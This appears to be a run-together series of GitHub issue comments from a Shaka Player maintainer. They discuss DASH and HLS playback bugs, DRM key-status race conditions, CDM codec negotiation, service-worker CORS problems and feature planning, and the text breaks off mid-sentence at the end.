Done!  https://github.com/google/shaka-player/issues?q=label%3ATV%2FSTB. De nada.. Thanks, Sam!  Any documentation or blog post available where we can find out more?. I'm not sure where this would best fit.\nCan you elaborate on how you prefetch the SIDX tables?  Is it done on the client in the same page context as playback?  Would it be sufficient to trust the browser cache to supply the SIDX when requested by Shaka Player?\nCan you also explain why you prefetch the SIDX?  Could you not get the bitrate information from the manifest or from the player?  (We provide this information from the manifest in our tracks API.). I don't think there is a simple way to do this in Shaka Player at the moment.\nIn case you want to dig around and find a way to do this, the SIDX is fetched in lib/dash/segment_base.js and parsed in lib/media/mp4_segment_index_parser.js.\nSince this use-case was never part of our design, I don't have a good recommendation for you.  If you come up with a suggestion, please let us know!. The languageMatches dictionary serves as an output parameter for both filterVariantsByConfig and filterStreamsByLanguageAndRole.  The output from those is then used to decide whether or not to display the text track by default.\nThe high level requirement is shown in a comment lower down in the same code:\njs\n    // If audio and text tracks have different languages, and the text track\n    // matches the user's preference, then show the captions.  Only do this\n    // when we are choosing the initial tracks during startup.\nWhen we do fuzzy language matching in the filter methods, we flag audio or text as having a language match if any of the streams matches the language preference at any of the fuzzy match levels:\njs\nshaka.util.LanguageUtils.MatchType = {\n  /** Accepts an exact match. */\n  EXACT: 0,\n  /** Accepts a less-specific version of the preferred sublanguage. */\n  BASE_LANGUAGE_OKAY: 1,\n  /** Accepts a different sublanguage of the preferred base language. */\n  OTHER_SUB_LANGUAGE_OKAY: 2,\n};\nThat's the full context for what we're trying to do.\nWhat the TODO means is that the way we achieve that feature feels clunky: we let the filter methods also flag matches (which isn't really the job of the filters), we use the side-effect of changing a dictionary as an output param, and we don't end up using the audio flag at all (we used to, I think).. Instead, let's just check for a language match explicitly after filtering.  We only need to do it for text, only on startup, and only on the chosen text track.  It shouldn't be expensive to repeat the language check, but it will be clearer.. Not yet.  We have not been able to reproduce #1476 yet.  I will try with the content you emailed us.  Perhaps if we can reproduce using your content, we can solve and close both issues.. I can reproduce in Firefox 61.0.1, 62.0b10, and 63.0a1.\nThe error logs from Firefox complain about our ServiceWorker, which is interesting.  It could be a bug in service_worker.js, or a bug in Firefox's ServiceWorker implementation, or maybe something in Firefox we can work around in our ServiceWorker.\nI will dig a little deeper.. I haven't been able to figure this out yet.  In the mean time, I recommend that you not use a ServiceWorker in your application.  Our demo uses one, but if you aren't using ServiceWorker, you should not run into this bug.. That depends on what your application looks like.  Are you using our demo service worker in your app verbatim?\nIn the Shaka Player demo app, we have this snippet that registers the service worker:\nhttps://github.com/google/shaka-player/blob/fa4954452663ae6d392b3a779e8b263d4dcd9aee/demo/main.js#L160\nYou would comment out the equivalent bit of code in your own app and then clear whatever service worker may already be installed by your browser.  In Chrome, you do this in the \"Application\" tab of the JS console.  In Firefox, I'm not sure where that happens.\nIf that is an effective workaround for you, then I recommend you do that for now until we can find the cause and provide a fix.. Investigation into #1392 revealed that we are handling requests in our service worker that could be ignored instead.  This may have some bearing on this issue as well.. Now that I've dug a bit deeper, avoiding fetch handling in our service worker doesn't solve your problem.  Nor does removing the service worker completely.  I still get CORS errors in Firefox for your content.  So I suspect the problem is between Firefox and your server, and has nothing to do with Shaka.\nSince you have a workaround anyway, may I close this issue?. I don't think I understand the timeline.  Can you put together an example that we could use to experience this effect and better understand it?\nAlso, what do you mean when you say it's both live and it \"ends\"?  What happens at the end in terms of the manifest?. @Feenposhleen, it should be easy enough to convert live to VOD during playback, so long as the presentation timeline does not change.  The timestamps seen by the video element are in the presentation timeline.\nFor example, if your live stream starts at availabilityStartTime of 2018-07-25 18:00:00 UTC, then that should be the wall time of the first segment, and its presentation timestamp should be 0.  If you later convert to VOD that starts at the same segment, the presentation timeline hasn't changed.\nIf, though, your live stream starts at wall time 2018-07-25 18:00:00 UTC, but with availabilityStartTime of availabilityStartTime of 1970-01-01 0:00:00 UTC, then your first segment's timestamp is 1532541600.  If you later convert to VOD and give that first segment a timestamp of 0, your presentation timeline has changed.\nThere is no easy way to support changing the presentation timeline like that during a MediaSource playback.  During the playback session, you can't just change the timeline and expect the browser to understand it.  Nor is it very easy to map between two (or more) timeline changes in the player to manage it above the browser.\nSince we don't have any examples of your content to work from, I can only guess that your timeline is changing when you convert from live to VOD.  When you reload the manifest, you're starting a new MediaSource session with a completely new timeline, which explains why this corrects playback in your case.\nIf your presentation timeline isn't changing, then it could be a Shaka Player bug.  We would need a way to reproduce the issue from our own workstations to find out more and solve the problem.. @chrisfillmore, I think you're spot on.  There are multiple NetworkingEngine instances so that there can be multiple Player instances.  Since networking filters are registered on the engine instance, and because those are used (among other things) for authentication, it should stay a per-Player instance.\nThe tension here is that we (especially @vaage) are working to make things like Storage independent of Player.  This means that Storage now needs a NetworkingEngine that it may not necessarily be able to get from a Player instance.. Are you referring to encoder drift?  That's when the duration of what the encoder outputs is less than the time it took.  For example, every 24 hours, only 23.9 hours of content is output.. If this is a question about encoder drift, we are planning a solution to that in #999.. Hi Leandro,\nWe are going to need a manifest URI (and license server URI, if applicable) that we can use to reproduce the error.  The contents of the manifest are not sufficient to reproduce a bug.  If you can't post a URI publicly, you can send one to shaka-player-issues@google.com.  Anything you send there will be kept confidential.\nThanks!. Thank you!. If this is a way to point just at the i-frames without having a separate container, I don't believe browsers are going to be able to support that.  It would be analogous to HLS's iframe-only playlists, which MediaSource in the browser can't accept.. @srstrong, we don't have any plans to reconstruct moof boxes to support this, but if it's something you're interested to work on, please let us know.  We can discuss your design and then review a PR with the changes.  Thanks!. Released in v2.5.0-beta2.. You can load ES6 modules now in a <script> tag, but only with type=\"module\".  The trouble is that adding the \"export\" keyword makes it incompatible with any other form of module.. Replaced by #1563, as this is part of a broader issue we have with HLS text.. Okay, sounds good.  I'll close this issue for now, and we can move discussion of subsegments to #1503.  Thanks!. When I played this today with the latest Shaka Player, it played without error, and without appending m3u8 to the URL.\nThere were some messages in the JS console such as \"Request header field range is not allowed by Access-Control-Allow-Headers in preflight response\", but that is caused by the server config, and is not in the control of Shaka Player.\nThere is also the message \"Unable to fetch a partial HLS segment! Falling back to a full segment request, which is expensive!  Your server should support Range requests and CORS preflights.\"  This is caused by the same server config (range requests & CORS), and is not in our control.\nThere are no deprecation errors in the console in the latest version of Shaka Player.\nBeyond that, the content plays.  The fallbacks we have in place to handle servers which don't support range requests are functioning as intended.\nDoes that help?. Okay, great.  Please let us know if you need anything else.  I'll go ahead and close this issue.. I will regenerate this and any other out-of-date HLS assets.. Note that the new files also will not have byte ranges, because Packager v2.2 requires separate segment files for any text stream.  Since the affects clips includes subtitles, we will just use separate segments for all streams.. The files have been updated, but this has spawned #1563.. It's not clear to me from the issue history what your problem is right now.  Can you please explain it again?  Also, can you please provide some content URLs so that we can reproduce your issue exactly?  Thanks!. Fix cherry-picked to v2.4.5.. We can add this as an enhancement to the backlog.. Excellent!  A PR is very welcome.. It used to be the case (I think) that restrictions would be reapplied when the config changed.  So this may be a regression.\nAlso, to clarify an earlier discussion, \"soft\" ABR restrictions only apply to ABR logic.  Tracks restricted at that level can still be selected manually via selectVariantTrack(), so it is not redundant with \"hard\" restrictions.  The top-level \"hard\" restrictions are meant to communicate something that should not be played, and have a primary purpose of communicating out-of-band DRM restrictions.  For example, on IE11, where key statuses are not available, restrictions and out-of-band DRM hints are the only way to avoid playing tracks that can't be decrypted with a given license.. I attempted to cherry-pick this bug fix to v2.4.5, but the merge conflicts were too complex to fix up.  So this bug fix will not appear in a release until v2.5.0-beta2.  We apologize for the inconvenience.. Released in v2.5.0-beta2.. I'm sorry, I don't understand why the keepOriginalTimestamps option will no longer work.  Is the option being removed?  How can we keep the behavior we have now after your change?. Oh, never mind.  I think I understand now that I've read https://github.com/videojs/mux.js/pull/213.  Tell me if I have this right:\n\nThe keepOriginalTimestamps option will still be there.\nThe behavior for video & audio will not change.\nThe behavior change is for captions, which will now have their original timestamps as well.  This was not the case before the change.\n\nIs that correct?. Gotcha.  Thanks!  We'll keep an eye on that as we work on upgrading.\nI'll go ahead and close the issue.. I'll look into it.  Thanks!. I managed to reproduce this with the latest code.  What I'm seeing is that Shaka Player thinks that we don't have the necessary keys.  It complains that key ID 3c452c3a37844ebfbc50c736761c8930 is missing.\nRepro notes for anyone else working on this: It's very inconsistent, and difficult to reproduce.  It doesn't require rapid load/unload, and it seems to reproduce within 10-15 tries.. In a failure case, the filtering in shaka.Player.prototype.checkRestrictedVariants_ runs several times without any key statuses.  Then it runs with one key ID, that of the audio track.  This is when the error is triggered, since we have no keys for video.  Then it runs again with all three keys (audio key + 2 video keys).\nSo this seems to be a race in licensing somehow.  Still digging.. There seems to be a race in the player.  If the licenses come in slightly apart, then some other event can trigger a restrictions check while we only know about some of the keys.\nIn my most recent repro, the timing between the two licenses is only 1 second.. Two main problems:\n\nDrmEngine batches up key statuses to avoid this problem, but it only waits 0.5 seconds.  In some cases, that's not long enough.\nThere appears to be a loophole: Player can pull key statuses from DrmEngine directly without waiting for an event.  So other events can trigger a restrictions check using the latest key statuses, which may still be in the process of \"batching up\".. Correction: DrmEngine batches up statuses to avoid a different problem.\n\nThe fix will be to close the loophole to avoid the player seeing incomplete data, and to delay sending key statuses to the player until all sessions have been updated.. The fix is in master now.  If you're waiting for a release, it should appear in v2.4.4 and v2.5.0.. In a nutshell, this request is for us to adapt between tracks as a way to avoid playback errors.  Is that right?. Okay, that sounds reasonable.  It will go onto the backlog for now, since our current milestones are very full.  I will also change the issue name to reflect the plan.  Thanks!. I can't reproduce, but my guess is that this has to do with the way periods interact with our Tracks API.\nThere are two periods which are important in today's Shaka Player: the \"current\" period (where the playhead is) and the \"active\" period (where streaming/buffering is happening).  These can differ if the buffered region spans one or more period boundaries.\nEach period has its own tracks, and the Tracks API shows tracks from the current period.  That is also what is shown in the UI.  When you manually change tracks in the UI, we take the Track ID and look up the corresponding Streams in the manifest.\nYour live stream would naturally drop periods that are outside the availability window.  So as the stream progresses, older periods go away and newer ones are introduced.  If the track you select has since been dropped, this would cause the \"Unable to locate track\" error you described.  (Since you converted to static VOD, I can't reproduce this, since all periods are available and none are ever removed.)\nThis is essentially a race, which is made worse by the very short periods in your content.\nI don't have any easy solutions, unfortunately.  One plan I would like to execute is to \"flatten\" periods in the DASH parser and remove the concept of periods from the rest of the code.  This would change the Tracks API so that the list of tracks wouldn't completely change across periods.  If your <Period> elements had similar <Representation> elements, you would not see changes in the tracks list during playback.  The race that is causing this issue for you would go away.  This idea is being discussed in #1339.\nIn the mean time, you could work around this issue by using longer periods.  This would make it less likely that you would run into this issue by reducing the time periods in which it could occur.  It may also improve the quality of your stream, since each of your period transitions seems to contain a tiny gap.\nYou should also make sure you are listening to the trackschanged event from the player and be sure to update any track-selection UI promptly when this happens.  A delay in processing this event would increase the odds of triggering this bug.\nDoes this help?. Okay.  May I go ahead and close this issue?. Ideally, we would have some way of extracting the defaults from the code into a generated doc.  We will have to build something new for that, though.  It's not provided by jsdoc.\nI've bumped this to v2.6, our code health and cleanup milestone.  For now, we need to wrap up on v2.5 features.. That seems reasonable.  I'll put this on the backlog, but we would be happy to accept a PR for this if you have time to work on it.  Thanks!. After some more discussion internally, I think we should add the config field manifest.dash.ignoreMinBufferTime, which will default to false.  If true, the DASH parser will ignore minBufferTime in the manifest, such that streaming.rebufferingGoal is the only factor in play.. Released in v2.5.0-beta2.. I'm okay with dedupe based on ID, since it's much simpler and supported by the spec.  (\"Processing of any one event message box with the same id is sufficient.\")\nI'll put this in the backlog for now, but we'd be happy to accept a PR if you have time to work on it.  Thanks!. Still reproducible with the latest code in master.  I'll look into this.. Something odd is happening with this content.  Period IDs and start times are not stable across updates.  There appears to be some rounding error.  For example, in a test run this morning, I captured and analyzed 5 consecutive manifest updates:\n| start times  | manifest 1 | manifest 2 | manifest 3 | manifest 4 | manifest 5 |\n| --- | --- | --- | --- | --- | --- |\n| period 1 | 0.000 | 0.000 | 0.000 | 0.000 | 0.000 |\n| period 2 | 2.987 | 2.986 | 2.986 | 2.986 | 2.986 |\n| period 3 | 5.973 | 5.973 | 5.973 | 5.973 | 5.973 |\n| period 4 | 8.960 | 8.960 | 8.960 | 8.960 | 8.960 |\n| period 5 | 11.947 | 11.946 | 11.946 | 11.946 | 11.946 |\n| period 6 | 14.933 | 14.933 | 14.933 | 14.933 | 14.933 |\n| period 7 | 17.920 | 17.920 | 17.920 | 17.920 | 17.920 |\n| period 8 | 20.907 | 20.906 | 20.906 | 20.906 | 20.906 |\n| period 9 | -- | 23.893 | 23.893 | 23.893 | 23.893 |\n| period 10 | -- | -- | 26.880 | 26.880 | 26.880 |\n| period 11 | -- | -- | -- | 29.866 | 29.866 |\n| period 12 | -- | -- | -- | -- | 32.853 |\nBetween manifest 1 & 2, some of the period start times and IDs change slightly.  I think this may be confusing Shaka Player, because it sees them as new, separate periods from the first versions.  If you wait long enough, playback eventually starts working once those first few periods (and their doppelg\u00e4ngers) drop out of the manifest.. Please see what you can do about the manifest stability.  Since the first few periods went away, I've had continuous playback at the live edge for 200+ manifest updates, so I expect we'll see the problem go away once you fix the IDs & start times.  Thanks!. Correction: The email alias for private URLs is shaka-player-issues@google.com. I have managed to reproduce the bug now twice, but it is very difficult.  I am adding console logging of various events to the repro case you sent us, and I will write back later once I can explain what's happening.  There seems to be a different set of events for the successful and failing test runs, but I still need more data.. I set it up so that it would reload the page automatically when video.currentTime hit 2.0, so that it would just retry for me until the bug was triggered.  It took 200 page refreshes to reproduce this time on Chrome 68 on Linux.\nSuccess event sequence: play, waiting, loadedmetadata, waitingforkey, seek, can play, playing\nFailure event sequence: play, waiting, loadedmetadata, waitingforkey, seek, waitingforkey, stalled\nFor the system to go back into \"waitingforkey\", there must be something wrong with the key statuses.  I'm still digging.. The key statuses are consistent between successful and failed runs.  This is very confusing.  The browser thinks it is stuck waiting for keys, but it also reports that it has them.  This could be a browser or CDM bug.  I'm not sure.. We believe this to be a browser or CDM bug.  There seems to be some kind of race condition between the CDM and the rest of the browser's media stack.\nI will try to modify your repro case to expose this bug with publicly-accessible content, and then file a bug on Chrome.. @TheModMaker, can you please turn this into a bug report against Chrome?  My hope is that someone on the Chrome CDM team can reproduce it with a debugging build and tell us what's going wrong to get into that state.. I'm going to make the crbug private so that we can include the content links and repro demos.  I will also CC the people who may be able to help track it down.  I apologize that this will make the crbug inaccessible outside of Google, but I hope it will allow us to get more expedient debugging help from Chrome team.. They are looking into the issue now, but we don't have any resolution yet.  They are looking carefully at possible sources of an internal race condition.. @ashish01july, the fix is in Firefox at this point, outside of Shaka Player.  You can try again with the latest version of Firefox and report your results here.  If it is still broken, please file an issue on https://bugzilla.mozilla.org/ and link to it here for us to follow along and provide additional support.. Sure, we can update the docs and possibly rename parameters without breaking compatibility.. Docs change cherry-picked to v2.4.5.. @TheJohnBowers, @BucherTomas is right.  The com.microsoft.playready key system does not support persistent licenses.  There is a lack of documentation from Microsoft on their new alternative, which is blocking our adoption of it.. Correction: shaka-player-issues@google.com is the email alias for sending us content URLs privately.. Restrictions (as in the Restrictions object from the config) are applied to every new period when it is introduced in a manifest update.  DRM restrictions (as reported by key status) are applied every time we get a key status event, but we require key IDs in the manifest to match this information up.\nChrome definitely reports key status changes, but I can't say whether or not your content contains key ID info in the manifest.  If not, this would explain your problem.\nI can look into it more when you are able to share manifest and license URIs with us, but in the mean time, you can check for the default_KID attributes in your DASH manifest.  If they are missing, then that's the root of your problem.. @bottmann, it seems like this is settled now, so I'm going to go ahead and close the issue.  You can reopen by writing @shaka-bot reopen in a comment.  Thanks!. > > 3. Some devices might have performance issues. I specifically work on Samsung and LG TVs. Those platforms are definitely non-performant and the app can be stuck when the CPU reaches its capacity. So, what if we implement to find/estimate the CPU performance of the device and perform a better variant selection by abrManager.\n\nWe only use the network bandwidth to adjust the current stream. But you should look at #907 and #745.\n\nThe MediaCapabilities API would also help with this (see #1391), but these existing TV platforms may not implement that API.. Sounds reasonable.  I'll add it to the backlog for now.  v2.5 is too full already.. I managed to reproduce using the latest code in master, which is currently equivalent to v2.5.0-beta released a few days ago.  I initially missed that subtitles must be enabled for this bug to reproduce.\nFull repro steps I came up with:\n\nPaste the goo.gl URL into the demo app as a custom asset\nClick load\nGet the real URL from the error message in the JS console (since the redirect at goo.gl does not support CORS)\nPaste the real URL into the custom asset field\nClick load\nWait for the content to play\nEnable subtitles\nSeek to the middle (roughly) of the seek range\n\nAlso reproduces in v2.4.4, v2.3.10, but not in v2.2.10.. When the assertion is triggered, the value of this.bufferedEnd_ in TextEngine is negative, which should not happen.  This occurs when the first text segment is appended because this.timestampOffset_ is very negative (-57486.242).\nThis offset value seems to come from this part of the manifest:\nxml\n      <Representation id=\"0\" bandwidth=\"1148\" codecs=\"wvtt\" mimeType=\"application/mp4\">\n        <SegmentTemplate timescale=\"1000\" presentationTimeOffset=\"57486242\"\n            initialization=\"--redacted--.mp4\" media=\"--redacted--_$Number$.m4s\"\n            startNumber=\"1\">\n          <SegmentTimeline>\n            <S t=\"57481600\" d=\"3200\" r=\"768\"/>\n          </SegmentTimeline>\nAccording to the manifest, it was generated by Shaka Packager version daf856fac9, which matches a fork you've made.  The fork seems to be up-to-date with the latest upstream Packager code, but I don't think your customizations could be responsible for the problem.  The changes are small, and I don't see any obvious problem in the diff.. This change in the Player seems to cause the issue: c38d4dd8d3e083ca218c174ab0e5e43ce2dc1cce\nAffected versions: v2.3.10, v2.4.2-v2.4.4, v2.5.0-beta. I found the cause in Shaka Player, and it should be easy to fix.  Thanks for reporting this!. Happy to help!. Fix cherry-picked to v2.4.5.. @ChristiaanScheermeijer, yes, I believe that is the same issue.. Since it seems easy, we will try to fit it into v2.5.  We just need to decide how the configuration will work.\nWe could create an additional URL field (per key-system) for this type of message.  Or we could create a map of message type to URL (per key-system).\nOr, we could add message type to the Request object, and let advanced routing based on message type be handled by request filters.. The advantage of the request approach is that apps could handle all message types if they wish, and it wouldn't make our configuration any more complicated.\nThe down side is that (if I understand correctly), individualization messages won't ever be destined for the same server as licenses, so not configuring this would almost certainly lead to failures.\n@rkuroiwa, is that accurate?\nIf individualization messages are special (must always go somewhere special), then a separate field might be a better reflection of this status, and make it easier to discover the solution to any problems encountered.. > I don't think it is the case that \"individualization messages won't ever be destined for the same server as licenses\". It just happens to be that my use case needs a separate URL. It feels more like an implementation detail or business logic.\nI was thinking that most individualization requests would be going to some central location run by the DRM provider, and that licenses might be served by something specific to the application.  If everything can be handled by the app's servers, why do we need this feature?\n\nWhat is going to be the default behavior if the user doesn't want to special case individualization-request messages, and just want to use the same URL?\n\nIf a separate URL is not provided, it would default to the one provided for licenses.\n\nI'm ok with shaka player propagating up the message type along with a Request object but I'm guessing that most use cases is simply sending the message somewhere else, rather than changing the content of the requests. Plus it requires extra network handling in the app.\n\nA URL string config is definitely easier for an app developer than writing a filter callback.  So there's that to consider.. Okay.  Then I think my gut says to offer a configurable URL string for the individualization requests, for simplicity, and to add the message type to DRM-related requests for generality.  Anybody who wants the common thing can do it easily, and anybody who wants more detailed routing can still get the info they need to do that.\nThanks for talking this out!. This feature was released in v2.5.0-beta2.. Hi @SemihGk, @vaage.  To clarify:\nThe difference between mp4a.40.2 and mp4a.40.5 has nothing to do with clear vs encrypted.  These are different profiles of AAC.  Either could be clear, and either could be encrypted.  Encryption is signalled outside of the codec string.\nAnd since these are two different AAC profiles, this shouldn't count as \"codec switching\" in MSE.  In general, we can switch profiles of the same codec.\nThe problem is this:\n\nWhen we negotiate with the browser for a CDM, we have to supply a list of MIME types we want to decode.  The browser then reports back which ones can be decoded in context of the CDM.  We use this information to filter out things the CDM can't decode.\nFor example, if your content has both VP9 and H.264, you would ask for both.  The browser may then report back that the CDM only supports H.264, so you would filter out VP9 as unusable.  Failing to do so could result in a playback failure later.\nOr, your content may contain multiple profiles of H.264, such as a baseline profile, a main profile, and a UHD profile.  You would ask for all of the ones you have in your content, and the browser may report back that the CDM only supports a subset of them, such as baseline & main, so you would filter out the UHD profile.  Failing to do so could result in a playback failure later.\nNow in your scenario, the main content has mp4a.40.5.  If we start playback during a main content period, we ask for a CDM that can decode this.  We hear back from the browser that yes, it can decode mp4a.40.5.  Later, during an ad break, we see mp4a.40.2 for the first time.  Since we never asked for a CDM that could decode that, it's not in the list from the browser.  So we're left assuming that the CDM can't decode it.  (In fact, in Chrome, the Widevine CDM can handle both just fine.)\n\nI see a few options right away:\n\nWe could assume that the CDM would support any profile we didn't ask about.  This could be risky, as it could lead to playback failures if we are wrong.\nWe could hard-code what different CDMs support.  This would be brittle and would need to be updated periodically.  It would also be hard to get this information for some CDMs.  And if there are platform-specific details to what the CDM supports, we would have no good way to discover and represent this in our hard-coded data.\nWe could ask for all profiles instead of just the ones in the manifest.  This would give us more info to work with on manifest updates, but it may be difficult to list all valid codec strings.  I believe there are 32 bits of info on an h.264 codec string, so brute force is out of the question.\nWe could, on a manifest update, renegotiate with the browser to find out if the CDM supports the new codec strings.  This could lead to two problems, though:\n  a. If the platform can only support one CDM instance at a time, this negotiation may fail for reasons unrelated to the codec strings.  This would lead to a playback failure.\n  b. If the platform supports multiple CDM implementations for the same key system (software-backed and hardware-backed), it may report success for the new codec strings, but for a different CDM implementation than the one currently in use.  This would lead to a playback failure.\nWe could tear down the media stack and renegotiate from scratch with the new details.  This would lead to an interruption in playback.  Our seamless multi-period playback would no longer be seamless.  As a slight improvement to this, we could keep track of all codec strings encountered in all manifest updates (even strings not currently present in the latest update of the manifest).  Once we have seen all the codec strings a live stream is going to encounter (in your case, after one ad break and one content period), there would be no more need to tear down the media stack.  This is probably the best option long-term, since it is the most robust.\nWe could offer a configurable codec string list that would supplement the manifest strings.  A service provider could reasonably know these in advance, and could tell us about them before we parse the manifest.  This would avoid the need to tear down the media stack, and would allow us to query all necessary codec strings early.  This is probably the best option short-term, since it is easy.\n\n\nBack to you, @vaage!. > I would like to speak out about some of those options:\n\n\n\nWe could assume that the CDM would support any profile we didn't ask about. This could be risky, as  it could lead to playback failures if we are wrong.\n\n\nThis option seems the easiest solution. In addition to this, we could implement a 'soft' restriction as we have it on AbrManager. Let's say, we can still filter out the unsupported codec profiles, but if there is no available variant left, we can leave one type of codec profiled variant which we did not ask it to CDM yet. \n\nEasy, yes.  But I don't think it's a good idea, because of the risk of playback failures.\nThe risk is this: if we assume the CDM supports anything we didn't ask about, we could fail playback in some cases.  What if your content goes up to UHD resolutions, or uses an HDR color space, but those features aren't supported by the CDM?  If we join during an ad break, we would perhaps only query SD & SDR profiles, then fail to decode later when the content is resumed.  Worse, it might be non-deterministic, because only the users with the most bandwidth would attempt playback of those streams.\n\n\n\nWe could, on a manifest update, renegotiate with the browser to find out if the CDM supports the new codec strings. This could lead to two problems, though:\n\n\nThis one sounds the most robust solution for me. Calling navigator. requestMediaKeySystemAccess once there are new codec profiles should solve this. However, I am not quite sure about your concerns. \n\na. If the platform can only support one CDM instance at a time, this negotiation may fail for reasons unrelated to the codec strings. This would lead to a playback failure.\n\nI checked some versions of EME specs out, but I could not find any information about which drafts have EME is singleton. I checked 0.1b Feb draft, that's not a singleton.\n\nIt's not about the EME spec.  MediaKeys is never a singleton, but there is no requirement that a user agent support multiple concurrent instances of MediaKeys in the same page.  In the past, I have worked on embedded HTML5 platforms which can only support a single video context at a time.  So it's not a stretch to imagine an embedded system that might only be able to support one CDM instance at a time.  After all, a CDM instance would consume limited hardware resources for hardware-based DRM.\nIf requestMediaKeySystemAccess is implemented universally in a way that is analogous to isTypeSupported for MediaSource, then you would expect to be able to simply query this for type support, without getting a rejection based on resources.  The rejection, if any, would then occur on createMediaKeys.  After re-reading the relevant parts of the spec, the spec text seems to support this.  Perhaps it would be safe to re-query.\n\n\nb. If the platform supports multiple CDM implementations for the same key system (software-backed and hardware-backed), it may report success for the new codec strings, but for a different CDM implementation than the one currently in use. This would lead to a playback failure.\n\nThis sounds a platform CDM implementation mistake. If different CDMs return report different results, I personally believe we should report this bug to the platform owners. I am just curios do you know any platform which has multiple CDMs for the same keySystem?\n\nThis is the case on Android, in which two CDM implementations can exist in parallel: hardware-backed, and pure-software implementations.  Both use the same key system ID, but have different robustness strings.  It's not a mistake, and it's not against the spec.\nIf we can assume that robustness strings or key system IDs will always differentiate between them, then we can make sure we are querying the same one as before.  I don't know if this assumption will hold on all platforms and with all key systems, but it might work.\n\n\n\nWe could tear down the media stack and renegotiate from scratch with the new details. This would lead to an interruption in playback. Our seamless multi-period playback would no longer be seamless. As a slight improvement to this, we could keep track of all codec strings encountered in all manifest updates (even strings not currently present in the latest update of the manifest). Once we have seen all the codec strings a live stream is going to encounter (in your case, after one ad break and one content period), there would be no more need to tear down the media stack. This is probably the best option long-term, since it is the most robust.\n\n\nI can see two issues on this solution. First one as you pointed out, there would be an interruption and this is definitely a bad experience for users. Second one, the implementation would require a bit work. The last one is that the stream might have more than 2 codec profile changes. For our case, we do not know all the ads have the same codec profiles. We need to discuss this with backend team.\n\nI think we can abandon this idea, for all the reasons we discussed.\n\n\n\nWe could offer a configurable codec string list that would supplement the manifest strings. A service provider could reasonably know these in advance, and could tell us about them before we parse the manifest. This would avoid the need to tear down the media stack, and would allow us to query all necessary codec strings early. This is probably the best option short-term, since it is easy.\n\n\nThis might be tough. As for our case, none of our ad segment may have the same codec profile. It may vary as the ad urls are inserted by a 3rd party company. If you think other options are not solid, we will need to discuss this with out back-end team.\n\nUnderstood.\nIt sounds like re-querying MediaKeys might be the best solution, then.  We would have to test it thoroughly on all supported platforms, though, so we need to come up with a good automated test for this.. Since the discussion was quite long, and many options were discussed, here's a summary for @vaage or whoever else winds up implementing what we discussed here:\nWhen new periods are introduced, we should filter them by re-querying MediaKeys instead of using the list of supported codec strings from the first query.  We expect this should work based on the spec text, but we also need to write a good automated test to ensure it works on all supported platforms.\nThe test would be something roughly like this:\n\nTest provides codec strings (and other necessary metadata) to DrmEngine.  The codec strings should be fairly universally-supported, such as baseline h264 and aac.\nDrmEngine negotiates a MediaKeys configuration.  (If this fails, skip the test.  EME may be unavailable, or the key system may be unavailable.)\nDrmEngine obtains a MediaKeys instance.  (What we want to ensure is that we can still negotiate again after an instance is created, so this is critical.)\nTest gets the list of supported codec strings from DrmEngine and stores them.\nTest provides updated codec strings and metadata to DrmEngine.  The updated strings are a superset of the first ones, such as higher level profiles of h264.\nDrmEngine negotiates another MediaKeys configuration.  (If this fails, fail the test.  A failure here means that we can't renegotiate after an instance is created.)\nTest checks that the supported codec strings reported by DrmEngine are a non-strict superset of the first codec strings.  (If this fails, fail the test.  A failure here means that we may have gotten a config for a different CDM implementation that supports different things.  We are assuming that key system id + robustness maps to a specific implementation.  Although this check can't always detect a different CDM implementation, it is a good start and increases our confidence in our assumptions.)\n\nRepeat this test for:\n\nWidevine, video & audio robustness set to SW_SECURE_CRYPTO for systems with software-based DRM.\nWidevine, video & audio robustness set to HW_SECURE_ALL for systems with hardware-based DRM.\nPlayReady, robustness strings empty.. I get different error details on my Windows 10 machine (5,8004b8d2), but it fails for me, too.  I tried both IE & Edge and got the same failure.\n\nI can't find any publicly documented meaning for either c00d36bb or 8004b8d2, but both are Microsoft error codes.  From what I can tell, they appear to be decoder-related, but that's just my best guess.\nOther PlayReady content plays fine, such as the \"Axinom Multi-DRM\" or \"Unified Streaming Tears of Steel (PlayReady)\" assets in the demo app's asset list.\nTo fix this, you would probably have to change something about the way the content is encoded, but I don't know what.  I would advise you to file an issue with Microsoft asking for support: https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/. I'm unable to reproduce this issue using the latest release (Shaka Player v2.4.4) in our demo app on Chrome.\nHere are my steps:\n\nOpen the demo page: https://v2-4-4-dot-shaka-player-demo.appspot.com/demo/\nClick the \"Load\" button\nOpen the JS console and network debug panel\nCall shakaDemo.localPlayer_.detach()\nObserve network panel: there are no calls to /h, nor to anything else triggered by detach()\nSimulate an ad by calling video.src = 'https://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4'\nReattach by calling shakaDemo.localPlayer_.attach(video)\nObserve network panel again: no calls to /h, nor anything else triggered by attach()\n\nI tried this in both uncompiled and compiled modes, in case the compiler renaming had something to do with it.\nSince you said you can't reproduce with our demo app, it's possible that the problem is in your own app.  I'd still like to help you solve it if I can, but it's tough to provide support for code we didn't write.\nIn the network panel in Chrome's debugger, you can see where a request came from in the \"Initiator\" column.  Here's a screenshot:\n\nIn this case, it shows me that http_fetch_plugin.js is responsible for requesting those webm segments.  Perhaps this can show you where the /h call is coming from in your demo.. Well, I'm glad you have a solution, but I'm sorry I couldn't be more help.. I'm relabeling this as a bug, since I can say with certainty that I didn't intend this part of the system to behave in this way.  But since you have a workaround and this may be solved during #816, I'm going to leave it in the backlog for now.  Thanks!. That's the classic symptom of drift.  The live edge in practice is before the live edge we computed.\nAfter #999 was closed, this should only be possible with SegmentTemplate+duration.  All other DASH manifest types should be immune, since we now look at the actual segment descriptions to decide where the live edge is.  But with SegmentTemplate+duration, there are no segment descriptions, so we must calculate the live edge based on availabilityStartTime.\nI haven't been able to look at the manifest yet. @vaage, can you check and see if this is the case?. With SegmentTemplate+SegmentTimeline, we should be immune to drift.  (Assuming the manifest is accurate, and we don't have a bug in the timeline calculations.)\n@vaage, if you have reproduced with the latest from master, try to analyze the manifest and media segments to see if they match.\nThe t attributes are in timescale units, using the manifest timescale (media timescale may differ).  You can reconstruct a segment URL from the manifest, fetch a segment, and compare the timestamp of the first frame with the one from the manifest.\nWhen constructing the URL, the first S element in the SegmentTimeline corresponds to segment number startNumber, which you fill in for $Number$ in the template.  The t attribute is what you fill in for $Time$ in the template.\nWe really need a tool to automate this kind of analysis.  Parse, interpret manifest, fetch media, extract timestamp, compare.. Why not use player.seekRange().end?. @yuanchieh-cheng, does this answer your question?  May we close the issue?. You definitely shouldn't be using \"sudo\" for any of this.  Shaka Player doesn't require root, and it doesn't require global installation of any dependencies.  Try starting over without sudo.. WARNING: An illegal 